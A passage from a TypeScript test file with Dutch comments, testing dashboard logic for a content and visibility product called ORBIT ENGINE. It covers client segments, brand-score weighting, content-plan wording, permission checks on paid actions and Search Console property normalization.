    { type: "profile_research", ownerKey: merk, status: "done", at: "2026-08-09T20:27:17Z" },
    { type: "profile_synthesis", ownerKey: merk, status: "done", at: "2026-08-09T20:32:51Z" },
  ];
  ok("werk dat later alsnog lukte telt niet meer", unresolvedFailures(echt).length === 0);

  // Andersom telt hij wél: eerst gelukt, daarna stuk, is stuk.
  const opnieuwStuk: JobOutcome[] = [
    { type: "profile_research", ownerKey: merk, status: "done", at: "2026-08-01T10:00:00Z" },
    { type: "profile_research", ownerKey: merk, status: "failed", at: "2026-08-09T10:00:00Z" },
  ];
  ok("een nieuwe mislukking ná een succes telt wel", unresolvedFailures(opnieuwStuk).length === 1);

  // Een ander soort taak lost niets op: dat de synthese lukte, zegt niets over
  // een mislukte meting.
  const anderSoort: JobOutcome[] = [
    { type: "measure_prompt", ownerKey: merk, status: "failed", at: "2026-08-01T10:00:00Z" },
    { type: "profile_synthesis", ownerKey: merk, status: "done", at: "2026-08-02T10:00:00Z" },
  ];
  ok("een ander taaksoort lost de mislukking niet op", unresolvedFailures(anderSoort).length === 1);

  // En een andere eigenaar ook niet: een geslaagde meting van analyse B zegt
  // niets over de mislukte meting van analyse A.
  const andereEigenaar: JobOutcome[] = [
    { type: "measure_prompt", ownerKey: "analysis:a", status: "failed", at: "2026-08-01T10:00:00Z" },
    { type: "measure_prompt", ownerKey: "analysis:b", status: "done", at: "2026-08-02T10:00:00Z" },
  ];
  ok(
    "een geslaagde taak van een andere analyse telt niet mee",
    unresolvedFailures(andereEigenaar).length === 1,
  );
});

group("segmentOf: elk merk in precies één segment", () => {
  const merk = (over: Partial<CsmBrand> = {}): CsmBrand => ({
    profileId: "p1",
    name: "Van den Udenhout",
    accountName: "Van den Udenhout",
    profileStatus: "klaar",
    profielCompleet: true,
    analyseStatussen: ["gereed"],
    quota: 10,
    heeftPlan: true,
    maandenTerGoedkeuring: 0,
    paginasTerGoedkeuring: 0,
    paginasTePlaatsen: 0,
    paginasTeLaat: 0,
    geplaatstDezeMaand: 10,
    laatstGeplaatst: "2026-08-01",
    pijplijnfouten: 0,
    fase: "overgedragen",
    ...over,
  });

  ok("een merk waar alles loopt", segmentOf(merk()) === "loopt");
  ok(
    "onderzoek dat nog draait",
    segmentOf(merk({ profileStatus: "bezig" })) === "onderzoek_loopt",
  );
  ok(
    "een half ingevuld merkprofiel wacht op nakijkwerk",
    segmentOf(merk({ profielCompleet: false })) === "nakijken",
  );
  ok(
    "zonder enige analyse is er niets om over te praten",
    segmentOf(merk({ analyseStatussen: [] })) === "geen_meting",
  );
  ok(
    "een maand die op akkoord wacht legt de bal bij de klant",
    segmentOf(merk({ maandenTerGoedkeuring: 1 })) === "wacht_op_klant",
  );
  ok(
    "een gemeten merk zonder plan",
    segmentOf(merk({ heeftPlan: false })) === "geen_plan",
  );

  // ⚠️ De volgorde ÍS de prioriteit. Een merk dat zowel vastloopt als op een
  // akkoord wacht, hoort in één lijst te staan, anders telt hij dubbel in elke
  // teller op het scherm.
  ok(
    "een pijplijnfout wint van alles",
    segmentOf(merk({ pijplijnfouten: 2, maandenTerGoedkeuring: 3 })) === "vastgelopen",
  );
  ok(
    "een mislukt profiel ook",
    segmentOf(merk({ profileStatus: "mislukt" })) === "vastgelopen",
  );

  // Elk merk valt in precies één segment: de som over de segmenten moet gelijk
  // zijn aan het aantal merken. Zonder die eigenschap kloppen de tabbladtellers
  // niet met de tabel eronder.
  const merken = [
    merk(),
    merk({ profileStatus: "bezig" }),
    merk({ profielCompleet: false }),
    merk({ analyseStatussen: [] }),
    merk({ maandenTerGoedkeuring: 1 }),
    merk({ heeftPlan: false }),
    merk({ pijplijnfouten: 1 }),
  ];
  const perSegment = CSM_SEGMENTS.map(
    (s) => merken.filter((m) => segmentOf(m) === s).length,
  );
  ok(
    "de segmenten tellen samen op tot het aantal merken",
    perSegment.reduce((a, b) => a + b, 0) === merken.length,
  );

  // Elk segment heeft een banner en een lege staat: een segment zonder banner
  // laat de lezer zelf uitzoeken wat de volgende stap is.
  ok(
    "elk segment zegt wat je moet doen",
    CSM_SEGMENTS.every(
      (s) => CSM_SEGMENT_META[s].banner.length > 0 && CSM_SEGMENT_META[s].leeg.length > 0,
    ),
  );

  // ── De vlaggen ────────────────────────────────────────────────────────────
  ok("een merk waar alles loopt heeft geen vlaggen", flagsOf(merk()).length === 0);
  ok(
    "onder de quota is een vlag",
    flagsOf(merk({ geplaatstDezeMaand: 3 })).some((v) => v.includes("3 van 10")),
  );
  ok(
    "en klaar om te plaatsen ook",
    flagsOf(merk({ paginasTePlaatsen: 2 })).some((v) => v.includes("klaar om te plaatsen")),
  );
  ok(
    "een merk zonder vlaggen dat loopt, vraagt niets",
    needsAttention(merk()) === false,
  );
  ok(
    "een vastgelopen merk wel",
    needsAttention(merk({ pijplijnfouten: 1 })) === true,
  );

  // ── De KPI's ──────────────────────────────────────────────────────────────
  const k = totals([
    merk({ paginasTePlaatsen: 2, paginasTeLaat: 1 }),
    merk({ maandenTerGoedkeuring: 1, paginasTerGoedkeuring: 4 }),
    merk({ pijplijnfouten: 3 }),
  ]);
  ok("achter op plaatsen telt op", k.achterOpPlaatsen === 2);
  ok("achter op schrijven ook", k.achterOpSchrijven === 1);
  ok("maanden en pagina's samen wachten op akkoord", k.wachtOpAkkoord === 5);
  ok("en de fouten", k.pijplijnfouten === 3);

  // ── De volgorde ───────────────────────────────────────────────────────────
  // Sorteren op naam zou een vastgelopen merk onderaan kunnen zetten omdat het
  // toevallig met een Z begint.
  const gesorteerd = sortForCsm([
    merk({ profileId: "a", name: "Aaa" }),
    merk({ profileId: "z", name: "Zzz", pijplijnfouten: 1 }),
  ]);
  ok("wat vastloopt staat bovenaan", gesorteerd[0].profileId === "z");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe startpagina: één merkcijfer (brand-score.ts, 25 augustus 2026)");

group("brandScorePerPeriod: één som voor drie blokken", () => {
  // De echte rijen van Gasservice Brabant, nagerekend op productie op
  // 25 augustus 2026. Eén cluster, twee periodes.
  const gasservice = [
    {
      analysis_id: "a",
      week_no: 0,
      score: "30.00",
      weighted_score: "29.00",
      score_stderr: "8.54",
      weighted_stderr: "9.62",
      winnable_runs: 30,
      judged_runs: 30,
      computed_at: "2026-08-12T07:59:22Z",
    },
    {
      analysis_id: "a",
      week_no: 1,
      score: "60.00",
      weighted_score: "57.00",
      score_stderr: "9.15",
      weighted_stderr: "7.65",
      winnable_runs: 29,
      judged_runs: 30,
      computed_at: "2026-08-15T08:58:13Z",
    },
  ];

  const p = brandScorePerPeriod(gasservice);
  ok("twee periodes, op volgorde", p.length === 2 && p[0].period === 0 && p[1].period === 1);

  // ⚠️ DIT IS DE HELE INGREEP. De standkaart toonde 57 en de duiding eronder
  // "van 30 naar 60": de gewogen score naast de ongewogen, op één scherm, voor
  // één begrip. Alle drie de blokken lezen nu deze som.
  ok("de gewogen score wint", p[1].score === 57);
  ok("en de bijbehorende onzekerheid komt mee", p[1].stderr === 7.65);
  ok("het aantal beoordeelde vragen telt op", p[1].vragen === 30);
  ok("en de meetdatum komt mee", p[1].gemetenOp === "2026-08-15T08:58:13Z");

  // Zonder gewogen score valt hij terug op de ongewogen, MET de bijbehorende
  // standaardfout. Nooit de een met de marge van de ander.
  const zonderGewogen = brandScorePerPeriod([
    { analysis_id: "a", week_no: 0, score: 40, weighted_score: null, score_stderr: 5, weighted_stderr: 9 },
  ]);
  ok("terugval op de ongewogen score", zonderGewogen[0].score === 40);
  ok("met de ongewogen onzekerheid", zonderGewogen[0].stderr === 5);

  // ⚠️ Een cluster met vijf metingen mag het merkcijfer niet even hard
  // bepalen als een cluster met negentig. Zonder weging zou het gemiddelde
  // hieronder 50 zijn; met weging trekt het grote cluster het naar 91.
  const tweeClusters = brandScorePerPeriod([
    { analysis_id: "groot", week_no: 3, score: 100, weighted_score: 100, winnable_runs: 90, judged_runs: 90 },
    { analysis_id: "klein", week_no: 3, score: 0, weighted_score: 0, winnable_runs: 5, judged_runs: 5 },
  ]);
  ok("het grote cluster weegt zwaarder", Math.round(tweeClusters[0].score) === 95);
  ok("en de vragen tellen over de clusters op", tweeClusters[0].vragen === 95);

  ok("zonder rijen geen periodes", brandScorePerPeriod([]).length === 0);
});

group("de startpagina: versheid, eerste maand en de plantelling (overview.ts)", () => {
  const nu = new Date("2026-08-25T10:00:00Z");

  // ⚠️ De meetronde draait op de eerste van de maand (`vercel.json`, 0 6 1 * *).
  const volgende = volgendeMeting(nu);
  ok(
    "1 september na 25 augustus",
    volgende.getUTCMonth() === 8 && volgende.getUTCDate() === 1,
  );
  const oudejaar = volgendeMeting(new Date("2026-12-20T10:00:00Z"));
  ok(
    "en over de jaargrens heen 1 januari",
    oudejaar.getUTCFullYear() === 2027 && oudejaar.getUTCMonth() === 0,
  );

  // Dit scherm is de bestemming na inloggen en er wordt maandelijks gemeten,
  // dus de regel moet zeggen of dit bezoek nieuws oplevert.
  const geenMeting = versheidsregel({ metingen: 0, gemetenOp: null, now: nu });
  ok("zonder meting belooft hij een datum", geenMeting.includes("1 september"));
  ok("en claimt hij geen cijfer", !geenMeting.includes("%"));

  const nulmeting = versheidsregel({ metingen: 1, gemetenOp: "2026-08-15T08:58:13Z", now: nu });
  ok("bij één meting heet het een nulmeting", nulmeting.includes("nulmeting"));
  ok("met de meetdatum erin", nulmeting.includes("15 augustus"));

  const tweede = versheidsregel({ metingen: 2, gemetenOp: "2026-08-15T08:58:13Z", now: nu });
  ok("daarna noemt hij de nieuwste meting", tweede.includes("15 augustus"));
  ok("en wanneer de volgende draait", tweede.includes("1 september"));

  // ⚠️ De eerste maand toont anders drie mijlpalen op nul, vier balken op nul en
  // een leeg ingeklapt blok. Dat is het eerste beeld van een betalende klant.
  ok("één meting zonder plan is de eerste maand", isEersteMaand({ metingen: 1, geplandePaginas: 0 }));
  ok(
    "een tweede meting haalt de verdieping terug",
    !isEersteMaand({ metingen: 2, geplandePaginas: 0 }),
  );
  ok(
    "en een contentplan ook",
    !isEersteMaand({ metingen: 1, geplandePaginas: 120 }),
  );

  // ⚠️ "1 pagina gepubliceerd" stond op hetzelfde scherm als "nog geen van je
  // 120 geplande pagina's staat live". Allebei waar, want de eerste pagina van
  // Gasservice Brabant is van vóór het contentplan. Het verschil hoort benoemd.
  const gasservice = planRegels({ gepland: 120, geplaatst: 0, gepubliceerdTotaal: 1 });
  ok("de eerste regel gaat alleen over het plan", gasservice[0].includes("120 geplande"));
  ok("en de tweede legt het verschil uit", gasservice[1].includes("vóór dit plan"));

  const gelijk = planRegels({ gepland: 120, geplaatst: 3, gepubliceerdTotaal: 3 });
  ok("zonder verschil is er geen tweede regel", gelijk.length === 1);
  ok("en telt de eerste regel de geplaatste", gelijk[0].includes("3 van je 120"));
});

group("de kansenlijst: alleen tonen wat onderscheidt (25 augustus 2026)", () => {
  // ⚠️ Bij Gasservice Brabant stond zes keer "Potentie 68/100 (hoge)" onder
  // elkaar: de potentiescore is zichtbaarheidsgat × zoekvolume, het zoekvolume
  // hoort bij het ONDERWERP, en dit merk heeft er één. De chip beloofde een
  // rangorde die er niet was.
  ok(
    "zes keer hetzelfde getal onderscheidt niets",
    !potentieVarieert([{ potential: 68 }, { potential: 68 }, { potential: 68 }]),
  );
  ok(
    "twee verschillende getallen wel",
    potentieVarieert([{ potential: 68 }, { potential: 31 }]),
  );
  ok("en een lijst zonder potentie ook niet", !potentieVarieert([{ potential: null }]));

  // Het pad in plaats van het volledige adres. Het adres van zeventig tekens
  // stond middenin de enige klikbare zin van de kaart.
  ok(
    "het pad is wat je leest",
    paginaPad("https://gasservice-brabant.nl/cv-ketel-onderhoud-tilburg/") ===
      "/cv-ketel-onderhoud-tilburg/",
  );
  ok("zonder adres geen pad", paginaPad(null) === null);
  ok("en een onleesbaar adres blijft staan", paginaPad("niet-een-url") === "niet-een-url");

  // Het verschil tussen nieuw werk en een correctie zat alleen in een tekening
  // van 18 pixels, en dat verschil bepaalt of je een uur of een dag kwijt bent.
  ok(
    "elke handeling heeft een woord",
    Object.values(OPPORTUNITY_ACTION_LABEL).every((l) => l.length > 0),
  );
  ok(
    "en nieuw werk heet anders dan een correctie",
    OPPORTUNITY_ACTION_LABEL.nieuwe_pagina !== OPPORTUNITY_ACTION_LABEL.pagina_bijwerken,
  );

  // ⚠️ De volle zin is 33 tekens en duwde de titel van de eerste kans over twee
  // regels. Kort in de kolom, volledig in de tooltip.
  ok("de korte vorm past in een kolom", reachShort(3, 30) === "3 van 30 vragen");
  ok("de volle zin blijft bestaan", reachLabel(3, 30) === "raakt 3 van de 30 gemeten vragen");
  ok("zonder noemer alleen de teller", reachShort(3, null) === "3 vragen");
  ok("één vraag is enkelvoud", reachShort(1, null) === "1 vraag");
  ok("zonder doelvragen geen getal", reachShort(null, 30) === null);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe vier cijfers op de startpagina (overview.ts, 26 augustus 2026)");

group("het contentplan zoals de klant het leest", () => {
  const maanden = [
    { id: "m1", monthNumber: 1, status: "goedgekeurd" as const },
    { id: "m2", monthNumber: 2, status: "ter_goedkeuring" as const },
    { id: "m3", monthNumber: 3, status: "concept" as const },
    { id: "m4", monthNumber: 4, status: "concept" as const },
  ];

  const keuze = leesMaandKeuze(maanden, 2);
  ok("deze maand is de lopende kalendermaand", keuze.deze?.id === "m2");
  ok("volgende is de maand erna", keuze.volgende?.id === "m3");
  ok("de rest is naslag", keuze.rest.map((m) => m.id).join(" ") === "m1 m4");

  // ⚠️ De kalender is leidend en niet de status. Wie op 3 september inlogt hoort
  // september te zien, ook als hij augustus nooit heeft vrijgegeven. Anders
  // kijkt hij naar een maand die voorbij is en ziet hij zijn eigen achterstand
  // aan voor de stand van nu.
  const achterstand = leesMaandKeuze(maanden, 3);
  ok("een niet vrijgegeven vorige maand schuift niet naar voren", achterstand.deze?.id === "m3");

  // Loopt de kalender voorbij het plan, dan is een leeg scherm geen antwoord.
  const voorbij = leesMaandKeuze(maanden, 9);
  ok("voorbij het plan valt het terug op de laatste maand", voorbij.deze?.id === "m4");
  ok("en dan is er geen volgende", voorbij.volgende === null);
  ok("zonder maanden geen keuze", leesMaandKeuze([], 1).deze === null);

  // ── De ene zin die zegt wat er van de klant gevraagd wordt ────────────────
  //
  // De volgorde is de volgorde waarin het werk vastloopt. Een goedgekeurde
  // tekst die niet gepubliceerd wordt levert per definitie nul op, en daar is
  // al voor betaald; een maand die nog vrijgegeven moet worden kost nog niets.
  const publiceren = planStap({
    maandStatus: "goedgekeurd",
    paginas: 10,
    terGoedkeuring: 3,
    teplaatsen: 2,
  });
  ok("publiceren gaat voor nakijken", publiceren.includes("publiceren"));
  const nakijken = planStap({
    maandStatus: "ter_goedkeuring",
    paginas: 10,
    terGoedkeuring: 3,
    teplaatsen: 0,
  });
  ok("nakijken gaat voor vrijgeven", nakijken.includes("akkoord"));
  const vrijgeven = planStap({
    maandStatus: "ter_goedkeuring",
    paginas: 10,
    terGoedkeuring: 0,
    teplaatsen: 0,
  });
  ok("en vrijgeven blijft over", vrijgeven.includes("vrijgave"));
  const leeg = planStap({ maandStatus: "concept", paginas: 0, terGoedkeuring: 0, teplaatsen: 0 });
  ok("een lege maand zegt bij wie hij moet zijn", leeg.includes("consultant"));
  const rustig = planStap({
    maandStatus: "goedgekeurd",
    paginas: 10,
    terGoedkeuring: 0,
    teplaatsen: 0,
  });
  ok("niets te doen belooft geen einde", !/klaar met|afgerond/i.test(rustig));
  ok("en zegt dat ORBIT ENGINE doorwerkt", rustig.includes("ORBIT ENGINE"));

  // ── De regel onder de maandkop ───────────────────────────────────────────
  ok(
    "één pagina is enkelvoud",
    maandRegel({ paginas: 1, geplaatst: 0, eersteDatum: "12 augustus" }) ===
      "Eén pagina deze maand, de eerste op 12 augustus.",
  );
  ok(
    "alles live zegt dat ook",
    maandRegel({ paginas: 4, geplaatst: 4, eersteDatum: null }).includes("allemaal live"),
  );
  // Conventie 3: geen datum verzinnen als er geen datum is.
  ok(
    "zonder datum geen datum",
    maandRegel({ paginas: 4, geplaatst: 0, eersteDatum: null }) === "4 pagina's deze maand.",
  );
  ok(
    "een lege maand zegt dat",
    maandRegel({ paginas: 0, geplaatst: 0, eersteDatum: null }) === "Nog niets ingepland.",
  );

  // ── Reservepagina's tellen niet mee ──────────────────────────────────────
  //
  // ⚠️ Ze staan klaar als er iets afvalt en horen niet in het maandtotaal dat
  // de klant leest. Doen ze dat wel, dan lijkt zijn pakket groter dan het is.
  const telling = telStatussen([
    { status: "goedgekeurd", is_buffer: false },
    { status: "ter_goedkeuring", is_buffer: false },
    { status: "geplaatst", is_buffer: false },
    { status: "gepland", is_buffer: true },
  ]);
  ok("de reserve telt niet mee", telling.echt === 3);
  ok("te plaatsen wordt geteld", telling.teplaatsen === 1);
  ok("nakijken wordt geteld", telling.terGoedkeuring === 1);
  ok("live wordt geteld", telling.geplaatst === 1);
});

group("de ronde: zes stappen, precies één aan de beurt", () => {
  // De stand van een klant die net binnen is: de nulmeting staat, de kansen
  // staan, en verder nog niets. Precies het moment waarop hij voor het eerst
  // alleen inlogt.
  const nieuweKlant = ronde({
    metingen: 1,
    kansen: 7,
    gepland: 0,
    geschreven: 0,
    gepubliceerd: 0,
    hermeten: 0,
  });

  ok("altijd zes stappen", nieuweKlant.length === 6);
  ok(
    "in de volgorde van de pijplijn",
    nieuweKlant.map((f) => f.id).join(" ") ===
      "meten kansen plannen schrijven publiceren hermeten",
  );
  ok("hooguit één stap is aan de beurt", nieuweKlant.filter((f) => f.actief).length === 1);
  ok("en dat is de eerste die nog niet staat", nieuweKlant.find((f) => f.actief)?.id === "plannen");
  ok(
    "wat gezet is, blijft gezet",
    nieuweKlant[0].klaar && nieuweKlant[1].klaar && !nieuweKlant[2].klaar,
  );

  // ⚠️ Twee van de zes wachten op de klant, en dat is de arbeidsverdeling van
  // het hele product: ORBIT ENGINE komt niet op zijn website.
  ok(
    "plannen en publiceren zijn van de klant",
    nieuweKlant.filter((f) => f.vanJou).map((f) => f.id).join(" ") === "plannen publiceren",
  );
  ok("en de zin zegt dat hij aan zet is", rondeZin(nieuweKlant).startsWith("Je bent aan zet"));

  // Een gat in het midden telt niet als voortgang: staat er niets geschreven,
  // dan is schrijven aan de beurt, ook al staat er al een pagina live van vóór
  // het plan. Bij Gasservice Brabant was dat precies zo.
  const gat = ronde({
    metingen: 2,
    kansen: 7,
    gepland: 12,
    geschreven: 0,
    gepubliceerd: 1,
    hermeten: 0,
  });
  ok("een lege stap in het midden is de actieve", gat.find((f) => f.actief)?.id === "schrijven");
  ok("en publiceren staat wel al op klaar", gat[4].klaar);

  // Een ronde die rond is, is geen ronde die af is.
  const rond = ronde({
    metingen: 3,
    kansen: 4,
    gepland: 12,
    geschreven: 12,
    gepubliceerd: 9,
    hermeten: 5,
  });
  ok("dan is geen enkele stap aan de beurt", rond.every((f) => !f.actief));
  ok(
    "en de zin belooft geen einde",
    !/(bent|is) klaar|voltooid|afgerond/i.test(rondeZin(rond)),
  );
  ok("maar zegt wel dat het doorloopt", rondeZin(rond).includes("maandelijks"));

  // Enkelvoud en meervoud, want deze standen staan bijna altijd op 0 of 1.
  const een = ronde({ metingen: 1, kansen: 1, gepland: 1, geschreven: 1, gepubliceerd: 1, hermeten: 1 });
  ok("één meting is enkelvoud", een[0].stand === "1 meting");
  ok("één tekst is enkelvoud", een[3].stand === "1 tekst");
  const leeg = ronde({ metingen: 0, kansen: 0, gepland: 0, geschreven: 0, gepubliceerd: 0, hermeten: 0 });
  ok("nul zegt wat er ontbreekt", leeg.every((f) => f.stand.startsWith("nog")));
  ok("en meten is dan de eerste stap", leeg.find((f) => f.actief)?.id === "meten");

  // ⚠️ Geen enkele stand claimt een doel. "3 van de 12" zou een norm zijn die
  // de klant niet zelf gesteld heeft.
  ok("geen enkele stand noemt een doel", rond.every((f) => !/ van de /.test(f.stand)));
});

group("wie mag betaald werk starten", () => {
  // ⚠️ Het besluit van 27 augustus 2026: de klant doet zijn eigen groeiwerk,
  // helemaal. Tot die dag stonden alle zes op slot en zag hij vier volle
  // knoppen die pas ná de klik weigerden, waarvan er één als taak in zijn eigen
  // werklijst stond.
  //
  // De reputatieanalyse is de uitzondering, en het is er precies één: dat is
  // geen stap in de maandelijkse ronde maar een los product dat apart gekocht
  // wordt. De knop blijft zichtbaar met een uitnodiging ernaast, want een
  // verborgen knop verkoopt niets.
  ok("een reputatieanalyse blijft van de beheerder", actionNeedsStaff("reputatie_starten"));
  ok("een nieuw merk onderzoeken doet de klant zelf", !actionNeedsStaff("merk_onderzoeken"));
  ok("de meting bevestigen doet de klant zelf", !actionNeedsStaff("meting_starten"));
  ok("een cluster starten doet de klant zelf", !actionNeedsStaff("analyse_starten"));
  ok("content laten schrijven doet de klant zelf", !actionNeedsStaff("content_schrijven"));
  ok("een maand vrijgeven doet de klant zelf", !actionNeedsStaff("plan_goedkeuren"));
  ok("precies één handeling staat op slot", STAFF_ONLY_ACTIONS.length === 1);

  // K2: elke melding is specifiek en klinkt als een uitnodiging, niet als een
  // dichte deur. Ze horen er ook te zijn voor de handelingen die nu open staan,
  // want het slot zit per handeling en kan terug.
  ok(
    "elke handeling heeft een eigen zin",
    new Set(Object.values(COST_DENIED)).size === Object.keys(COST_DENIED).length,
  );
  ok(
    "en geen enkele zin klinkt als geen toegang",
    Object.values(COST_DENIED).every((z) => !/geen toegang|niet toegestaan|mag niet/i.test(z)),
  );
});

group("welk menu-item licht op", () => {
  const clusters = {
    href: "/merk/abc/strategie/clusters",
    label: "Clusters",
    hoofdstuk: "Strategie" as const,
  };
  const bibliotheek = {
    href: "/merk/abc/strategie/bibliotheek",
    label: "Bibliotheek",
    hoofdstuk: "Strategie" as const,
  };

  ok("de bestemming zelf", navActief("/merk/abc/strategie/clusters", clusters));
  // ⚠️ De reden dat deze functie bestaat: het clusterdossier woont op een eigen
  // adres, en tot 27 augustus 2026 lichtte er in de hele zijbalk niets op zolang
  // de klant daar was. Juist op het diepste scherm van de app.
  ok("een cluster laat Clusters oplichten", navActief("/analyses/xyz", clusters));
  ok("de tekstpagina in dat cluster ook", navActief("/analyses/xyz/bibliotheek/1", clusters));
  ok("maar de bibliotheek van het merk niet", !navActief("/analyses/xyz", bibliotheek));
  ok(
    "en twee items lichten nooit tegelijk op",
    [clusters, bibliotheek].filter((i) => navActief("/analyses/xyz", i)).length === 1,
  );
  // Bestemmingen zijn elkaars prefix: /merkprofiel is het begin van
  // /merkprofiel/bewerken, en dat mag niet allebei oplichten.
  const dossier = {
    href: "/merk/abc/merkprofiel",
    label: "Merkdossier",
    hoofdstuk: "Merkprofiel" as const,
  };
  ok("een kind laat de ouder niet oplichten", !navActief("/merk/abc/merkprofiel/bewerken", dossier));
});

group("overzichtCijfers: drie totalen en één stand van nu", () => {
  // ⚠️ Herschreven op 28 augustus 2026. Tot die dag kwamen twee van de vier
  // cijfers uit de KANSENLIJST, dus uit voorstellen: bij Van den Udenhout stond
  // de rij op 0 · 0 · 7 · 5 terwijl er nog geen letter geschreven was. De rij
  // telt nu wat er gemaakt is, over de hele looptijd.
  const c = overzichtCijfers({
    clusters: 1,
    geschreven: 1,
    geoptimaliseerd: 1,
    gepubliceerd: 1,
  });

  ok("altijd precies vier cijfers", c.length === 4);
  ok(
    "de clusters staan vooraan, de publicaties achteraan",
    c[0].label === "Cluster actief" && c[3].label === "Gepubliceerd",
  );

  // ⚠️ Geen enkel cijfer draagt een vergelijking met een vorige periode. Het
  // aantal clusters verandert door een besluit, niet doordat er gemeten is, en
  // de andere drie zijn optellingen over de hele looptijd.
  ok(
    "geen enkele detailregel claimt groei",
    c.every((x) => !/\+|sinds|steeg|daalde|vorige/.test(x.detail)),
  );
  ok("en elk cijfer heeft een toelichting", c.every((x) => x.detail.length > 0));

  // ⚠️ Alleen het eerste cijfer is een stand van NU. Dat verschil moet uit de
  // toelichting blijken, want de kop boven de rij zegt "sinds de start" en die
  // geldt voor de andere drie.
  ok("het eerste cijfer zegt dat het van nu is", c[0].detail === "Nu actief");

  // Enkelvoud en meervoud, want deze getallen staan vaak op 1 of op 0.
  ok("één geschreven pagina is enkelvoud", c[1].label === "Pagina geschreven");
  ok("één optimalisatie is enkelvoud", c[2].label === "Pagina geoptimaliseerd");
  const meer = overzichtCijfers({
    clusters: 3,
    geschreven: 4,
    geoptimaliseerd: 2,
    gepubliceerd: 5,
  });
  ok("meer clusters is meervoud", meer[0].label === "Clusters actief");
  ok("meer pagina's is meervoud", meer[1].label === "Pagina's geschreven");
  ok("meer optimalisaties is meervoud", meer[2].label === "Pagina's geoptimaliseerd");
  // ⚠️ "Gepubliceerd" kent geen enkelvoud. Het label slaat op twee soorten
  // tegelijk (nieuwe pagina's én optimalisaties), en "1 gepubliceerde pagina of
  // optimalisatie" past niet in een kolom van 190 pixels.
  ok("gepubliceerd verandert nooit van vorm", meer[3].label === "Gepubliceerd");

  // ⚠️ Nul is hier een echte telling en geen onbekende waarde (conventie 3 gaat
  // over gokken, niet over tellen). De detailregel zegt wel wat nul betekent.
  const leeg = overzichtCijfers({
    clusters: 0,
    geschreven: 0,
    geoptimaliseerd: 0,
    gepubliceerd: 0,
  });
  ok("nul blijft nul", leeg.every((x) => x.waarde === "0"));
  ok("en zegt waarom het nul is", leeg[1].detail === "Nog niets geschreven");

  // ⚠️ Vier kolommen naast elkaar, waarvan drie ook een scheidingslijn met
  // inspringing dragen: die zijn 24 pixels smaller dan de eerste. Een
  // toelichting die daar over twee regels valt, maakt de rij rafelig en de
  // kolommen ongelijk hoog. 23 tekens is wat er in de smalste kolom past.
  ok(
    "elke toelichting past op één regel",
    [...c, ...meer, ...leeg].every((x) => x.detail.length <= 23),
  );
  ok("ook de nulvarianten", leeg.every((x) => x.detail.length <= 23));
});

group("totalenKop: de regel die zegt dat het totalen zijn", () => {
  // ⚠️ Zonder deze regel leest een klant met twaalf geschreven pagina's de rij
  // als "deze maand". Met een datum erbij is het concreter dan "sinds de start",
  // en die datum staat er toch al: de oudste analyse van dit merk.
  ok(
    "met een startdatum staat de maand erin",
    totalenKop("2026-03-04T10:00:00Z") === "Sinds maart 2026",
  );
  ok(
    "zonder startdatum blijft het algemeen",
    totalenKop(null) === "Sinds de start van je programma",
  );
  // Onbruikbare invoer wordt nooit een halve zin op het scherm (conventie 3).
  ok(
    "en onleesbare invoer ook",
    totalenKop("geen datum") === "Sinds de start van je programma",
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nSearch Console koppelen (fase 5, migratie 0052)");

group("normalizeProperty: de twee vormen die Google kent", () => {
  // ⚠️ Search Console kent twee soorten property en ze zien er allebei anders
  // uit dan een webadres. Wie "voorbeeld.nl" invult krijgt van Google een 404
  // zonder uitleg, en dan denkt iemand dat de koppeling stuk is terwijl er een
  // teken mist.
  const domein = normalizeProperty("sc-domain:Voorbeeld.NL");
  ok("een domein-property gaat door", domein.ok === true);
  ok(
    "en wordt kleingeschreven",
    domein.ok === true && domein.property === "sc-domain:voorbeeld.nl",
  );

  const adres = normalizeProperty("https://voorbeeld.nl");
  ok(
    "een adres-property krijgt de verplichte schuine streep",
    adres.ok === true && adres.property === "https://voorbeeld.nl/",
  );
  ok(
    "een pad houdt zijn slotstreep",
    (() => {
      const r = normalizeProperty("https://voorbeeld.nl/shop");
      return r.ok === true && r.property === "https://voorbeeld.nl/shop/";
    })(),
  );

  // De meest gemaakte vergissing: het kale domein. De melding noemt beide
  // vormen, want "ongeldig" laat de lezer raden.
  const kaal = normalizeProperty("voorbeeld.nl");
  ok("een kaal domein wordt geweigerd", kaal.ok === false);
  ok(
    "met beide vormen in de melding",
    kaal.ok === false &&
      kaal.reason.includes("sc-domain:voorbeeld.nl") &&
      kaal.reason.includes("https://voorbeeld.nl/"),
  );

  ok("leeg wordt geweigerd", normalizeProperty("   ").ok === false);
  ok("sc-domain zonder domein ook", normalizeProperty("sc-domain:").ok === false);
  ok(
    "en een domein-property met een pad",
    normalizeProperty("sc-domain:voorbeeld.nl/shop").ok === false,
  );
});

group("syncWindow: welke dagen ORBIT ENGINE ophaalt", () => {
  const nu = new Date("2026-08-11T09:00:00Z");

  // ⚠️ Google's definitieve cijfers lopen twee dagen achter. Wie gisteren als
  // bewijs gebruikt, meet ruis.
  const eerste = syncWindow(null, nu);
  ok("het venster stopt twee dagen terug", eerste.eind === "2026-08-09");
  ok(
    "een eerste ronde gaat negentig dagen terug",
    eerste.start === "2026-05-12" && eerste.dagen === EERSTE_RONDE_DAGEN,
  );

  // ⚠️ Google herziet dagen na. Zou het venster alleen de nieuwe dagen pakken,
  // dan bevriest een half gecorrigeerde dag voor altijd in de database.
  const vervolg = syncWindow("2026-08-05", nu);
  ok(
    "een vervolgronde haalt het nawerkvenster opnieuw op",
    vervolg.start === "2026-07-26",
  );
  ok("en loopt door tot dezelfde einddag", vervolg.eind === "2026-08-09");
  ok("er is werk", heeftWerk(vervolg));

  // Staat de laatste dag al voorbij het venster, dan is er niets te doen.
  const nietsTeDoen = syncWindow("2026-08-09", new Date("2026-08-10T09:00:00Z"));
  ok(
    "een venster dat achterstevoren loopt levert geen werk op",
    !heeftWerk(nietsTeDoen) || nietsTeDoen.start <= nietsTeDoen.eind,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe lus sluiten (fase 6): kansen en inzichten");

group("opportunities: één lijst, gesorteerd op wat het oplevert", () => {
  const basis = {
    profileId: "p1",
    recommendations: [
      { title: "Klein", why: "x", targets: [{ weight: 0.05 }] },
      { title: "Groot", why: "y", targets: [{ weight: 0.2 }, { weight: 0.1 }] },
      { title: "Onbekend", why: "z", targets: null },
    ],
    unmeasuredTopics: [{ id: "t1", title: "Auto leasen" }],
    crawlerBlocked: false,
    readyToPublish: 0,
